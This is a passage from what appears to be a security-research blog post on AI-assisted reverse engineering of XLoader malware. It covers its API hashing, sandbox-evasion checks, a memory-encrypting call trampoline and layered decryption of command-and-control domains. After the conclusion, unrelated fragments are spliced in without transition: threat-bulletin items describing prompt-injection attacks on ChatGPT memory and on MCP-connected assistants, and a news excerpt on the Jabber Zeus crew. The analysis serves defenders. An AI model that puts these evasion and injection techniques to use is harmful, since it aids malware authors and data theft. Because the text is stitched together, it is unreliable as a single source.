&lt;p&gt;As the assistant did not have access to IDA, we had to test the script manually. If there were errors, we sent the results back to the chat and asked for corrections. It took five iterations and about 20 additional minutes to obtain a fully working version.&lt;/p&gt;



&lt;p&gt;Therefore, we also asked the assistant to analyze an alternative path:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Analyze routine `sub_404603` as an alternate API-hash decrypter. Recover its algorithm. Find call sites. Extend the IDAPython deobfuscator.&lt;/pre&gt;



&lt;p&gt;It took another five iterations (sending back errors and corrections) and 14 minutes before we obtained a fully functional script.&lt;/p&gt;



&lt;p&gt;XLoader uses the same hash-decryption mechanism to look for sandbox artifacts, virtual machines, and processes typical of a researcher’s environment. While fixing issues, we also added dictionary-based hash brute forcing (loading the wordlist from a separate file), which let us automatically annotate not only functions but also certain strings corresponding to specific evasion techniques:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32120" height="335" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image23.png" width="527" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 24&lt;/strong&gt;&amp;nbsp;&amp;#8211; Deobfuscated API function and string identifiers.&lt;/p&gt;



&lt;p&gt;As a bonus, we received a summary of how API resolution works, describing two different methods:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="&amp;lt;strong&amp;gt;Figure 25&amp;lt;/strong&amp;gt; - Description of the two methods for
decrypting hashes and resolving API functions." src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image24.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 25&lt;/strong&gt;&amp;nbsp;&amp;#8211; Description of the two methods for decrypting hashes and resolving API functions.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Overall, it took roughly one hour of the AI assistant’s work to go from the first prompt to a fully functional API deobfuscation script. This figure does not include local testing or the time spent writing prompts. For this task, the human effort was minimal.&lt;/p&gt;



&lt;p&gt;The table below summarizes the prompts we used and the time required for each step:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Prompt&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Time consumed&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Notes&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Initial prompt (instructions)&lt;/td&gt;&lt;td&gt;1m 26s&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;The IAT is empty, with no plaintext strings in the sample.&lt;br /&gt;Determine how the sample resolves and invokes Windows APIs. Start the analysis from &lt;code&gt;oep_start&lt;/code&gt; (&lt;code&gt;0x00430CB3&lt;/code&gt;).&lt;/td&gt;&lt;td&gt;4m 28s&lt;/td&gt;&lt;td&gt;Found only one path (ai_apiid_decrypt).&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Implement an IDAPython script for deobfuscating API calls. Annotate the resolver and every call site with Module!Function, original ID, and EA; IDA 9+. Log all deobfuscation attempts.&lt;/td&gt;&lt;td&gt;9m 44s&lt;/td&gt;&lt;td&gt;The script did not work.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;Multiple&lt;/em&gt;&lt;/td&gt;&lt;td&gt;20m&lt;/td&gt;&lt;td&gt;Local testing of the script and sending error reports, 5 iterations.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Analyze routine &lt;code&gt;sub_404603&lt;/code&gt; as an alternate API-hash decrypter. Recover its algorithm. Find call sites. Extend the IDAPython deobfuscator.&lt;/td&gt;&lt;td&gt;4m 49s&lt;/td&gt;&lt;td&gt;Described the second API resolution path through ai_apiid_decrypt_salt (formerly sub_404603). The updated script did not work.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;Multiple&lt;/em&gt;&lt;/td&gt;&lt;td&gt;14m 35s&lt;/td&gt;&lt;td&gt;Local testing of the script, sending error reports and notes on incorrect behavior, 5 iterations.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Please provide a summary on two algorithms &lt;code&gt;ai_apiid_decrypt_salt&lt;/code&gt;, &lt;code&gt;ai_apiid_decrypt&lt;/code&gt; -&amp;gt; &lt;code&gt;ai_resolve_export&lt;/code&gt;&lt;/td&gt;&lt;td&gt;17s&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;em&gt;Total time&lt;/em&gt;&lt;/td&gt;&lt;td&gt;55m 2s&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;Additional protection of critical API calls&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;While reviewing the API call deobfuscation results, we noticed that some functions are invoked through an interesting wrapper which was originally hidden among the encrypted functions at address &lt;code&gt;0x0040AC93&lt;/code&gt; (&lt;code&gt;ai_dec_func_16&lt;/code&gt;).&lt;/p&gt;



&lt;p&gt;This function acts as a&amp;nbsp;&lt;em&gt;secure-call trampoline&lt;/em&gt;: it temporarily encrypts nearly the entire image before invoking a function pointer and then decrypts those same regions once the call returns. Only a tiny “island” (the space between the call-site’s return address and a marker) remains unencrypted by the per-call XOR so that execution can proceed.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32140" height="411" src="https://research.checkpoint.com/wp-content/uploads/2025/10/image-5.png" width="975" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 26&lt;/strong&gt;&amp;nbsp;&amp;#8211; “Secure-call trampoline” decompiled function explained by LLM.&lt;/p&gt;



&lt;p&gt;What makes this mechanism notable? Because the function stays encrypted nearly the entire time, it is difficult to even detect its existence without static decryption. In memory dumps, it appears only in encrypted form.&lt;/p&gt;



&lt;p&gt;At the same time, if some security software or a sandbox hooks API calls protected by this wrapper and tries to analyze or dump the process memory at the time of the call, the mechanism effectively shields the malicious code.&lt;/p&gt;



&lt;p&gt;In total, 20 functions are protected this way, including NTAPI routines related to processes, threads, memory, and file operations, as well as several WinSock functions. The full list is shown in the image below:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32123" height="288" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image26.png" width="468" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 27&lt;/strong&gt;&amp;nbsp;&amp;#8211; The list of API calls protected by “secure-call trampoline.”&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="string-decryption"&gt;String decryption&lt;/h2&gt;



&lt;p&gt;The sample contains no readable strings. At the same time, the code features a series of short routines that share the same skeleton: the prologue allocates a small stack frame and initializes a local array (its size varies by function). This is followed by a recurring trio of calls with the same order and identical argument signatures:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32124" height="476" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image27.png" width="618" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Figure 28&lt;/strong&gt;&amp;nbsp;&amp;#8211; Example of an encrypted string in XLoader code.&lt;/p&gt;



&lt;p&gt;Let’s analyze one of these functions. Because we started a fresh session for this task, we instructed the AI assistant to trust the existing comments that briefly describe each function’s behavior, so it doesn’t reanalyze routines that were already covered.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Analyze the functionality starting from `sub_405773`. Recurse into its callees. Trust the comments in the disassembly.&lt;/pre&gt;



&lt;p&gt;As a result, we determined that this function decrypts a string using the algorithm implemented in one of the previously decrypted routines (&lt;code&gt;ai_dec_func14&lt;/code&gt;). Note how the AI built the call graph and described each routine’s behavior from a single short prompt, relying solely on the data in the previously prepared archive:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32125" height="434" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image28.png" width="691" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 29&lt;/strong&gt;&amp;nbsp;&amp;#8211; Call graph and description of the string decryptor stub.&lt;/p&gt;



&lt;p&gt;With a simple prompt, we readily obtain the encryption keys and the decrypted string.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Decrypt the string from `sub_405773`.&lt;/pre&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32126" height="449" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image29.png" width="658" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 30&lt;/strong&gt;&amp;nbsp;&amp;#8211; String decryption result with derived key and ciphertext.&lt;/p&gt;



&lt;p&gt;Now that we are confident the AI assistant understands how the encrypted strings are stored, knows how the key is derived, and already analyzed and correctly reimplemented the decryption algorithm (verifying it on real data), we can move on to implementing a script to decrypt the remaining strings.&lt;/p&gt;



&lt;p&gt;This time we used a slightly more detailed prompt because we wanted specific information to appear both in the comments and in the console output:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Implement an IDAPython script (IDA 9+) that decrypts strings. Requirements:
- Find and annotate every call to the decrypter function `sub_4050F3` with the decrypted string.
- For each string, output debug info: encrypted buffer, XOR tweak byte (`BL`), length, and decrypted bytes.
- Print all binary data in hex.&lt;/pre&gt;



&lt;p&gt;This time we were lucky and immediately got a working script which we used to decrypt 175 strings:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-32127" height="311" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image30-1024x311.png" width="1024" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 31&lt;/strong&gt;&amp;nbsp;&amp;#8211; Decrypted strings in IDA.&lt;/p&gt;



&lt;p&gt;The total time required for the analysis was about 20 minutes:&lt;/p&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Prompt&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Time consumed&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Initial prompt (instructions)&lt;/td&gt;&lt;td&gt;1m 26s&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Analyze the functionality starting from sub_405773. Recurse into its callees. Trust the comments in the disassembly.&lt;/td&gt;&lt;td&gt;7m 45s&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Decrypt the string from sub_405773&lt;/td&gt;&lt;td&gt;5m 10s&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Implement an IDAPython script (IDA 9+) that decrypts strings. Requirements:Find and annotate every call to the decrypter function sub_4050F3 with the decrypted string.For each string, output debug info: encrypted buffer, XOR tweak byte (BL), length, and decrypted bytes.Print all binary data in hex.&lt;/td&gt;&lt;td&gt;5m 30s&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Total time&lt;/td&gt;&lt;td&gt;19m 51s&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;We now have a decrypted sample with deobfuscated strings and API calls that we can analyze like a regular binary. However, XLoader is not that simple: some data remains encrypted even at this stage.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="decrypting-domain-names"&gt;Decrypting domain names&lt;/h2&gt;



&lt;p&gt;Extracting lists of Indicators of Compromise (IoCs) is always a critical task in malware analysis. Network indicators, such as domain names and URLs, are especially important because they help detect and classify malware through traffic analysis. That is why extracting domains is essential — even though some may be decoys or bait, or currently inactive but intended for later use.&lt;/p&gt;



&lt;p&gt;Among the recovered strings, we see 64 Base64-encoded entries. Looking at the version history of XLoader, we find that starting from version 2.8 it began storing encrypted domain names in Base64 form. Without a doubt, these 64 Base64 strings represent domain names that we must decrypt. As early as version 4, XLoader added two additional layers of modified RC4 encryption with different keys, making the decryption more complicated. In later versions, this process became even more complex. In total, to reach the decrypted domain names we need to peel off at least five layers after first identifying where and how the keys are initialized: decrypt the functions that initialize encrypted strings, decrypt the strings themselves (which we already did earlier), base64-decode the results, and apply two more layers of decryption.&lt;/p&gt;



&lt;p&gt;At the same time, obtaining the keys for each layer is the most difficult part, as the different pieces of data needed to generate them are scattered across multiple functions, making them hard to locate.&lt;/p&gt;



&lt;p&gt;Before moving on, we updated our string deobfuscation script so that it also renames the functions responsible for retrieving decrypted strings and assigns a prefix&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_domain_{NN}&lt;/code&gt;&lt;/em&gt;&amp;nbsp;to all functions handling Base64-encoded strings. We then exported the database to prepare for domain decryption.&lt;/p&gt;



&lt;p&gt;All calls to the&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_domain_{NN}&lt;/code&gt;&lt;/em&gt;&amp;nbsp;functions occur inside a single function,&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_func_0&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(&lt;em&gt;&lt;code&gt;0x00404913&lt;/code&gt;&lt;/em&gt;):&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32128" height="540" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image31.png" width="407" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 32&lt;/strong&gt;&amp;nbsp;&amp;#8211; Domain generation function.&lt;/p&gt;



&lt;p&gt;We start the analysis of this function using the simplest prompt:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Analyze `ai_dec_func_0` (0x00404913)&lt;/pre&gt;



&lt;p&gt;As a result of our analysis, we obtained a detailed description showing that &lt;code&gt;ai_dec_func_0&lt;/code&gt; (later renamed to &lt;code&gt;ai_dec_func_0_domain_tag_generate&lt;/code&gt;) is XLoader’s stage-1 domain builder. For a given domain index (1..64), it pulls the matching seed string from&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_domain_NN&lt;/code&gt;&lt;/em&gt;, base64-decodes it, then runs a keyed RC4-with-diff transform whose key is a 20-byte secret stored at&amp;nbsp;&lt;em&gt;&lt;code&gt;ctx+0x23D0&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(where&amp;nbsp;&lt;em&gt;&lt;code&gt;ctx&lt;/code&gt;&lt;/em&gt;&amp;nbsp;is a global structure that stores keys, function addresses, and other data), and byte-XORed with the domain index. The result is re-encoded to base64 and written to the output buffer. This is an intermediate artifact, not the final ASCII domain.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="&amp;lt;strong&amp;gt;Figure 33&amp;lt;/strong&amp;gt; - Domain generation function analysis
report." src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image32.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;strong&gt;Figure 33&lt;/strong&gt;&amp;nbsp;&amp;#8211; Domain generation function analysis report.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;A special “token” branch is enabled when&amp;nbsp;&lt;em&gt;&lt;code&gt;a5==222&lt;/code&gt;&lt;/em&gt;&amp;nbsp;is used for generating a path string for a URL. It emits a short pattern&amp;nbsp;&lt;em&gt;&lt;code&gt;/&amp;lt;4-byte token&amp;gt;/&lt;/code&gt;&lt;/em&gt;&amp;nbsp;from a static table and applies the same keyed transform.&lt;/p&gt;



&lt;p&gt;Next, we asked the assistant to reproduce the transformations implemented in &lt;code&gt;ai_dec_func_0_domain_tag_generate&lt;/code&gt;. Because our script already retrieved the decrypted strings and added them as comments in the previous step, we requested that these strings also be used alongside the repeated string decryption:&lt;/p&gt;



&lt;p&gt;Comments in the disassembly of &lt;em&gt;&lt;code&gt;ai_dec_domain_NN&lt;/code&gt;&lt;/em&gt; contain base64-encoded encrypted domain names.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Take the one from `ai_dec_domain_01`, then transform it with `ai_dec_func_0` and return the final string.&lt;/pre&gt;



&lt;p&gt;As a result, our assistant was unable to locate the key at&amp;nbsp;&lt;em&gt;ctx+0x23D0&lt;/em&gt;&amp;nbsp;on its own:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32130" height="59" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image33.png" width="740" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 34&lt;/strong&gt;&amp;nbsp;&amp;#8211; AI was unable to locate the key.&lt;/p&gt;



&lt;p&gt;That was not surprising, as none of the exported data contained references to the structure’s fields and can only be located by the offset in the structure, or captured in the debugger.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32132" height="302" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image35.png" width="684" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 35&lt;/strong&gt;&amp;nbsp;&amp;#8211; Initialization of the RC4 key for decrypting the first layer.&lt;/p&gt;



&lt;p&gt;We therefore had to manually locate where this key was initialized and provide that information to the AI assistant.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;You can find `ctx+0x23D0` initialization in `ai_dec_func_4` (`0x00407293`), also check `sub_404453`.
After the keys were extracted, we tried again:Now you have the required key.
Take the sting from `ai_dec_domain_01`, then transform it with `ai_dec_func_0` and return the final string.&lt;/pre&gt;



&lt;p&gt;As a result, we obtained an intermediate value for the string returned by&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_domain_01&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(&lt;em&gt;&lt;code&gt;1Qo1bG/xbpI2gGY8lCzWBw==&lt;/code&gt;&lt;/em&gt;) after the first decryption layer, which was re-encoded in Base64 as (&lt;em&gt;&lt;code&gt;Qvm75Acm5NpYTbnYXdcvBw==&lt;/code&gt;&lt;/em&gt;):&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32132" height="302" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image35.png" width="684" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 36&lt;/strong&gt;&amp;nbsp;&amp;#8211; Result of reproducing the domain generation function’s behavior for index 2.&lt;/p&gt;



&lt;p&gt;Because the string is still encrypted, and we do not yet know what happens to it next, we need to investigate further:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;The string you returned is still encrypted. Trace the complete transformation chain from `ai_dec_func_0` (case 2, string `Qvm75Acm5NpYTbnYXdcvBw==`) to the final ASCII domain. 
Discover any remaining layers, locate and derive all required keys/parameters from the context/initializers, and cite function names with EAs used. 
Output the final domain, and a concise step-by-step pipeline, print all keys/IVs as hex. If any value is missing, state exactly what it is and where to read it.&lt;/pre&gt;



&lt;p&gt;As a result, we discovered that the obtained Base64 string is decoded again and then decrypted by a second layer using a 20-byte key generated inside the function&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_func_11&lt;/code&gt;&lt;/em&gt;&amp;nbsp;(&lt;em&gt;&lt;code&gt;0x004095F3&lt;/code&gt;&lt;/em&gt;). This key is additionally XORed with&amp;nbsp;&lt;em&gt;SALT_DWORD&lt;/em&gt;. However, the initialization of&amp;nbsp;&lt;em&gt;&lt;code&gt;SALT_DWORD&lt;/code&gt;&lt;/em&gt;&amp;nbsp;is missing from&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_func_11&lt;/code&gt;&lt;/em&gt;, and the assistant was therefore unable to retrieve it on its own.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32133" height="688" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image36.png" width="1014" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 37&lt;/strong&gt;&amp;nbsp;&amp;#8211; AI was unable to locate the Stage-2 key.&lt;/p&gt;



&lt;p&gt;As in the previous case, we manually recovered the missing value. The complication was that instead of offset&amp;nbsp;&lt;em&gt;0x25C8&lt;/em&gt;, the base&amp;nbsp;&lt;em&gt;0x2000&lt;/em&gt;&amp;nbsp;was used, with&amp;nbsp;&lt;em&gt;0x5C8&lt;/em&gt;&amp;nbsp;added later, which made the search a bit more difficult.&lt;/p&gt;



&lt;p&gt;We provided not only the address of the function where the initialization of&amp;nbsp;&lt;em&gt;&lt;code&gt;SALT_DWORD&lt;/code&gt;&lt;/em&gt;&amp;nbsp;was assumed to occur, but also the relevant code snippets:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;You can find SALT_DWORD in `ai_dec_func_20` (`0x00411053`). Please verify and continue:
.text:004111B3 81 C7 00 20 00 00                       add     edi, 2000h
...
.text:0041182B C7 87 C8 05 00 00 00 A6                 mov     dword ptr [edi+5C8h], 0C6EA600h&lt;/pre&gt;



&lt;p&gt;During the analysis, our AI assistant confirmed that the key was correct and successfully decrypted the domain corresponding to&amp;nbsp;&lt;em&gt;ai_dec_domain_01&lt;/em&gt;:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-32134" height="201" src="https://research.checkpoint.com/wp-content/uploads/2025/10/VU7DWNN81O-image37.png" width="736" /&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 38&lt;/strong&gt;&amp;nbsp;&amp;#8211; Result of successful domain decryption.&lt;/p&gt;



&lt;p&gt;Now the AI assistant can automatically decrypt all the domains. Let’s verify this by asking it to decrypt the first 16 domains:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Decrypt domains from `ai_dec_domain_00` to `ai_dec_domain_15`. Output: table (index, src_base64, final_domain). Take per-function base64 from `ai_dec_domain_NN` disassembly comments.&lt;/pre&gt;



&lt;p&gt;In the end, we obtained a table with the fully decrypted domain names:&lt;/p&gt;

&lt;p&gt;Let’s recall that at the very beginning of the analysis we discovered a separate branch of&amp;nbsp;&lt;em&gt;&lt;code&gt;ai_dec_func_0&lt;/code&gt;&lt;/em&gt;&amp;nbsp;that activates when the last value equals 222. In this case, a 4-character tag is generated which later becomes part of the URL. Previously, this tag was the same for all domains and unique to a malware campaign. Now, however, each domain has its own tag.&lt;/p&gt;



&lt;p&gt;We tried to decrypt the tags for the first 16 domains using the following prompt:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;Reproduce the output of `ai_dec_func_0` for a5=222 and domain index 0..15.&lt;/pre&gt;



&lt;p&gt;In response to the prompt, the assistant provided a description of how the malware generates those 4-character tags, and the table containing the first 16 tags.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;

&lt;/div&gt;

&lt;h2 class="wp-block-heading"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;From its initial appearance, XLoader has always been a moving target, with each new version raising the bar for security analysts and defenders. XLoader began as a two-layer puzzle but evolved into a maze of nested decryptors, scattered key material, and runtime-only code. For years, this meant that by the time researchers fully unraveled a sample, attackers were already one step ahead with the next version.&lt;/p&gt;



&lt;p&gt;Generative AI changes this balance. Combining cloud-based analysis and occasional MCP-assisted runtime checks, we delegated a large part of the mechanical reverse engineering to LLM. Instead of spending hours rewriting decryption routines by hand, we asked our AI model to do it and received working prototypes in minutes.&lt;/p&gt;



&lt;p&gt;The use of AI doesn’t eliminate the need for human expertise. XLoader’s most sophisticated protections, such as scattered key derivation logic and multi-layer function encryption, still require manual analysis and targeted adjustments. But the heavy lifting of triage, deobfuscation, and scripting can now be accelerated dramatically. What once took days can now be compressed into hours.&lt;/p&gt;



&lt;p&gt;For defenders, this is more than a productivity boost. Faster turnaround means fresher IoCs, quicker detection updates, and a shorter window of opportunity for attackers. For researchers, it lowers the entry barrier to analyzing some of the most complex malware families in the wild.&lt;/p&gt;



&lt;p&gt;Our research shows that with the right workflows, generative models can already serve as a force multiplier — helping security defenders keep pace with threats that were once considered prohibitively time-consuming to analyze.&lt;/p&gt;



&lt;p&gt;However, it’s too soon to declare victory, as we expect malware authors to adapt their techniques in response to AI-assisted analysis. And in turn, we’ll need to come up with the next game-changer.&lt;/p&gt;

&lt;li&gt;The Everest ransomware group has &lt;a href="https://hackread.com/everest-att-leak-dublin-airport-data/"&gt;claimed&lt;/a&gt; responsibility for a series of attacks impacting AT&amp;amp;T, Dublin Airport, and Air Arabia. The ransomware gang exfiltrated sensitive data including 576,000 AT&amp;amp;T applicant records, 1.5 million Dublin Airport passenger files, and 18,000 Air Arabia employee records. Sweden’s power grid operator Svenska kraftnät has also &lt;a href="https://www.svk.se/press-och-nyheter/nyheter/allmanna-nyheter/2025/svenska-kraftnat-har-blivit-utsatta-for-ett-dataintrang/"&gt;disclosed&lt;/a&gt; a recent attack by Everest, resulting in the alleged theft of 280 GB of their internal data.&lt;/li&gt;

&lt;ul&gt;
&lt;li&gt;CVE-2025-12036 and CVE-2025-12428, are critical remote code execution and high-severity type confusion vulnerabilities in Google Chrome&amp;#8217;s V8 JavaScript engine. The vulnerabilities were reported and &lt;a href="https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html"&gt;patched&lt;/a&gt;in Chrome version 142.0.7444.59/.60, exposing over three billion users to possible compromise via malicious web content prior to the update being released.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://layerxsecurity.com/blog/layerx-identifies-vulnerability-in-new-chatgpt-atlas-browser/"&gt;identified&lt;/a&gt;critical vulnerabilities in OpenAI’s Atlas browser. It includes a CSRF flaw that allows attackers to inject malicious instructions into ChatGPT’s memory for remote code execution and persistent compromise. Testing showed Atlas blocked only six percent of phishing attacks, making ChatGPT users 90% more vulnerable than those using traditional browsers.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.operant.ai/art-kubed/shadow-escape"&gt;discovered&lt;/a&gt; Shadow Escape, a zero-click exploit in popular AI assistants. The exploit leverages Model Context Protocol (MCP) connections in popular AI assistants like ChatGPT, Claude, and Gemini to exfiltrate sensitive data—including financial, medical, and personal identifiers. These bypassing traditional security by embedding malicious instructions in uploaded documents.&lt;/li&gt;

&lt;p&gt;Sources close to the investigation say &lt;strong&gt;Yuriy Igorevich Rybtsov&lt;/strong&gt;, a 41-year-old from the Russia-controlled city of Donetsk, Ukraine, was previously referenced in U.S. federal charging documents only by his online handle &amp;#8220;&lt;strong&gt;MrICQ&lt;/strong&gt;.&amp;#8221; According to &lt;a href="https://www.justice.gov/iso/opa/resources/2162014411104532407242.pdf" rel="noopener" target="_blank"&gt;a 13-year-old indictment&lt;/a&gt; (PDF) filed by prosecutors in Nebraska, MrICQ was a developer for a cybercrime group known as &amp;#8220;&lt;strong&gt;Jabber Zeus&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72498" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72498" height="678" src="https://krebsonsecurity.com/wp-content/uploads/2025/11/rybtsov-lockedup.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72498"&gt;Image: lockedup dot wtf.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The Jabber Zeus name is derived from the malware they used &amp;#8212; a custom version of the &lt;a href="https://krebsonsecurity.com/?s=zeus+trojan" rel="noopener" target="_blank"&gt;ZeuS banking trojan&lt;/a&gt; &amp;#8212; that stole banking login credentials and would send the group a Jabber instant message each time a new victim entered a one-time passcode at a financial institution website. The gang targeted mostly small to mid-sized businesses, and they were an early pioneer of so-called &amp;#8220;man-in-the-browser&amp;#8221; attacks, malware that can silently intercept any data that victims submit in a web-based form.&lt;/p&gt;
&lt;p&gt;Once inside a victim company&amp;#8217;s accounts, the Jabber Zeus crew would modify the firm&amp;#8217;s payroll to add dozens of &amp;#8220;money mules,&amp;#8221; people recruited through elaborate work-at-home schemes to handle bank transfers. The mules in turn would forward any stolen payroll deposits — minus their commissions — via wire transfers to other mules in Ukraine and the United Kingdom.&lt;/p&gt;
